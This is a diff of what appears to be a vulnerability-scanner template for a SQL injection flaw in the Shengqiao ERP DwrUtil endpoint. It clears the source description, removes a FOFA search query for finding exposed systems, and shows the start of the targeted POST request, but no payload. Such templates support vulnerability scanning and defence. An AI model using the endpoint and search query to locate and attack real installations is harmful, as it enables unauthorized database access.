@@ -3,12 +3,8 @@ info:
   name: 圣乔ERP系统 存在DwrUtil SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hh4gemvda6kn8yga'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hh4gemvda6kn8yga
-    fofa: title="圣乔ERP系统"
 http:
 - raw:
   - 'POST /erp/dwr/call/plaincall/DwrUtil.getSupplyQueryKeyword.dwr HTTP/1.1
